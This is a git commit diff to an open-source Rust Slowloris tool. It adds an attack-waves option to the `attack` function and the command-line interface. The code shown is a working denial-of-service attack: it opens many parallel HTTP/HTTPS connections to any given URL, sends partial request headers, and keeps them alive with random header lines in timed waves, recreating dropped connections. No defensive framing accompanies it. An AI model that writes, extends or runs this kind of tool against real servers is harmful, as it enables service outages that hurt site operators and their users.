7f2503b5200ae0649cb3355b7d7f7fe89cbbbc4a
Jan Nils Ferner <jn_ferner@hotmail.de>
2017-11-01 17:45:46 +0100

    Add wave definition feature

--- src/lib.rs
+++ src/lib.rs
@@ -20,7 +20,8 @@ use std::net::TcpStream;
 use std::time::Duration;
 use std::thread;
 
-pub fn attack(url: &str, timeout: u64, requests: u64) -> Result<(), LorisError> {
+pub fn attack(url: &str, timeout: u64, requests: u64, waves: u64) -> Result<(), LorisError> {
+    println!("Preparing connections...");
     let url = Url::parse(url)?;
     let init_header = get_init_header(&url);
     let mut connections: Vec<_> = (0..requests)
@@ -28,30 +29,49 @@ pub fn attack(url: &str, timeout: u64, requests: u64) -> Result<(), LorisError> 
         .map(|_| spawn_connection(&url, &init_header))
         .collect();
 
-    loop {
-        println!("Attacking...");
+    println!(
+        "Starting attack on {} with {} requests in {} waves, each lasting {} ms",
+        url,
+        requests,
+        waves,
+        timeout
+    );
+    for i in 0..waves {
+        println!("Attack wave {}/{}", i + 1, waves);
         connections.par_iter_mut().for_each(|connection| {
             let loris_header = get_loris_header();
             let res = connection.write_all(&loris_header);
             if res.is_err() {
-                println!("Timeout, reseting connection...");
+                println!("A connection timed out, recreating it... ");
                 let mut new_connection = spawn_connection(&url, &init_header);
                 std::mem::swap(connection, &mut new_connection);
             }
         });
-        println!("Done!");
         thread::sleep(Duration::from_millis(timeout));
     }
+    Ok(())
 }
 
 
 fn get_stream(url: &Url) -> Stream<TcpStream> {
-    let domain = url.host_str().unwrap();
-    let port = url.port_or_known_default().unwrap();
-    let stream = TcpStream::connect((domain, port)).unwrap();
+    let domain = url.host_str().expect("Failed to parse host string");
+    let port = url.port_or_known_default().expect(
+        "Failed to guess port for specified protocol",
+    );
+    let stream = TcpStream::connect((domain, port)).expect(&format!(
+        "Failed to connect to {}:{}",
+        domain,
+        port
+    ));
     if url.scheme() == "https" {
-        let connector = TlsConnector::builder().unwrap().build().unwrap();
-        Stream::Tls(connector.connect(domain, stream).unwrap())
+        let connector = TlsConnector::builder()
+            .expect("Failed to create TlsConnectorBuilder")
+            .build()
+            .expect("Failed to build TlsConnector");
+        Stream::Tls(connector.connect(domain, stream).expect(&format!(
+            "Failed to connect to {} via TLS",
+            domain
+        )))
     } else {
         Stream::Plain(stream)
     }
@@ -59,7 +79,10 @@ fn get_stream(url: &Url) -> Stream<TcpStream> {
 
 fn spawn_connection(url: &Url, init_header: &[u8]) -> Stream<TcpStream> {
     let mut stream = get_stream(url);
-    stream.write_all(init_header).unwrap();
+    stream.write_all(init_header).expect(&format!(
+        "Failed to send header to {}",
+        url
+    ));
     stream
 }
 
@@ -71,14 +94,14 @@ fn get_init_header(url: &Url) -> Vec<u8> {
          Host: {}\r\n\
          User-Agent: {}\r\n",
         url.path(),
-        url.host_str().unwrap(),
+        url.host_str().expect("Failed to parse host string"),
         user_agent
     ).as_bytes()
         .to_vec()
 }
 
 fn get_loris_header() -> Vec<u8> {
-    format!("X-a: {}\r\n", rand::random::<u32>())
+    format!("X-a: {}\r\n", rand::random::<u64>())
         .as_bytes()
         .to_vec()
 }
--- src/main.rs
+++ src/main.rs
@@ -2,7 +2,7 @@ extern crate slowloris;
 #[macro_use]
 extern crate clap;
 
-use clap::Arg;
+use clap::{Arg, ArgMatches};
 
 fn main() {
     let matches = app_from_crate!()
@@ -27,17 +27,29 @@ fn main() {
                 .default_value("1024")
                 .help("Sets the amount of parallel requests per attack"),
         )
+        .arg(
+            Arg::with_name("waves")
+                .short("w")
+                .long("waves")
+                .value_name("NUM")
+                .default_value("100")
+                .help("Sets the amount of total attack waves"),
+        )
         .get_matches();
 
     let url = matches.value_of("URL").unwrap();
-    let timeout = matches.value_of("timeout").unwrap().parse::<u64>().expect(
-        "Please provide a valid number as timeout",
-    );
-    let requests = matches
-        .value_of("requests")
-        .unwrap()
-        .parse::<u64>()
-        .expect("Please provide a valid number as requests");
+    let timeout = unwrap_arg(&matches, "timeout");
+    let requests = unwrap_arg(&matches, "requests");
+    let waves = unwrap_arg(&matches, "waves");
 
-    slowloris::attack(url, timeout, requests).expect("Error while attacking");
+    slowloris::attack(url, timeout, requests, waves).expect("Error while attacking");
+}
+
+fn unwrap_arg(matches: &ArgMatches, name: &str) -> u64 {
+    matches.value_of(name).unwrap().parse::<u64>().expect(
+        &format!(
+            "Please provide a valid number as value for the parameter '{}'",
+            name
+        ),
+    )
 }
